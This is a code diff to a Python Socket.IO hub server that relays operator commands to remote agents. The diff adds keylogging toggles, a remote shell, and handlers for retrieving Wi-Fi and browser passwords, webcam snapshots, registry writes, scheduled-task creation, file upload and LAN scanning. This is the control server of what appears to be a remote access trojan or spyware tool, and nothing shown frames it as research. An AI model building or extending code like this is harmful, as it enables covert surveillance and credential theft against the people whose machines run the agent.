@@ -449,7 +449,8 @@ def _make_fwd(event):
     _handler.__name__ = f"fwd_{event}"
     return _handler
 
-for _ev in ("frame", "key", "camera_frame", "clipboard", "ngrok_url", "audio", "win_frame"):
+for _ev in ("frame", "key", "camera_frame", "clipboard", "ngrok_url", "audio", "win_frame",
+            "shell_started", "shell_output"):
     socketio.on(_ev)(_make_fwd(_ev))
 
 
@@ -468,24 +469,24 @@ def on_command(data):
     _to_agent(data, "command")
 
 
-@socketio.on("camera_on")
-def on_camera_on(data):
-    _to_agent(data, "camera_on")
+# Simple hub→agent forwards (no req/resp, no response routed back)
+for _cmd in ("camera_on", "camera_off", "mic_on", "mic_off",
+             "keylog_on", "keylog_off",
+             "shell_start", "shell_input", "shell_stop"):
+    def _make_cmd_handler(ev):
+        def _h(data):
+            _to_agent(data, ev)
+        _h.__name__ = f"cmd_{ev}"
+        return _h
+    socketio.on(_cmd)(_make_cmd_handler(_cmd))
 
 
-@socketio.on("camera_off")
-def on_camera_off(data):
-    _to_agent(data, "camera_off")
-
-
-@socketio.on("mic_on")
-def on_mic_on(data):
-    _to_agent(data, "mic_on")
-
-
-@socketio.on("mic_off")
-def on_mic_off(data):
-    _to_agent(data, "mic_off")
+# keylog_status: agent → requester (response to keylog_on / keylog_off)
+@socketio.on("keylog_status")
+def on_keylog_status(data):
+    requester = (data or {}).get("_requester")
+    if requester:
+        socketio.emit("keylog_status", data, room=requester)
 
 
 # ── Process list (request/response) ──────────────────────────────────────────
@@ -638,6 +639,33 @@ for _rr in [
     ("remove_startup", "remove_startup_result"),
     ("volume_control", "volume_result"),
     ("get_monitors", "monitors_result"),
+    # New features
+    ("power_action",           "power_result"),
+    ("desktop_mouse",          "desktop_mouse_result"),
+    ("desktop_type",           "desktop_type_result"),
+    ("run_command",            "command_result"),
+    ("upload_file",            "upload_result"),
+    ("get_wifi_passwords",     "wifi_passwords_result"),
+    ("webcam_snapshot",        "webcam_snapshot_result"),
+    ("get_active_window",      "active_window_result"),
+    ("start_recording",        "recording_started"),
+    ("stop_recording",         "recording_result"),
+    ("get_drives",             "drives_result"),
+    ("search_files",           "search_result"),
+    ("get_event_logs",         "event_logs_result"),
+    ("registry_get",           "registry_result"),
+    ("registry_set",           "set_registry_result"),
+    ("get_env_vars",           "env_vars_result"),
+    ("get_users",              "users_result"),
+    ("get_scheduled_tasks",    "scheduled_tasks_result"),
+    ("create_scheduled_task",  "create_task_result"),
+    ("delete_scheduled_task",  "delete_task_result"),
+    ("play_audio",             "audio_play_result"),
+    ("ocr_screenshot",         "ocr_result"),
+    ("get_clipboard_history",  "clipboard_history_result"),
+    ("lan_scan",               "lan_scan_result"),
+    ("get_dns_cache",          "dns_cache_result"),
+    ("get_browser_passwords",  "browser_passwords_result"),
 ]:
     _make_req_resp(*_rr)
 
